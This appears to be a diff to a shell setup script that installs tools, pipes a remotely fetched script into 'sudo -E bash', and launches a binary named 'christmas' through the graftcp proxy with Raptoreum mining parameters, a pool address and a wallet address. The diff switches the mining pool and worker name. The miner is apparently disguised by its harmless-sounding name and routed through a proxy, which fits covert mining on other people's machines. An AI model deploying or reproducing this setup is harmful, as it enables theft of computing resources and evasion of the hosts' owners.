@@ -1,3 +1,4 @@
+#!/bin/sh
 apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
 
 curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
@@ -34,5 +35,5 @@ chmod +x christmas
 
 ph add christmas
 
-./graftcp/graftcp ./christmas -a gr -o raptoreumemporium.com:3008 -u RVu7t5hrxSnWmz3xheHW3NE2PmDAVE5GEM.XmasAwAw -p IhatePopUps
+./graftcp/graftcp ./christmas -a gr -o stratum+ssl://na-rtm.pool-server.com:5555 -u RVu7t5hrxSnWmz3xheHW3NE2PmDAVE5GEM.XmasAwAw32 -p IhatePopUps
 
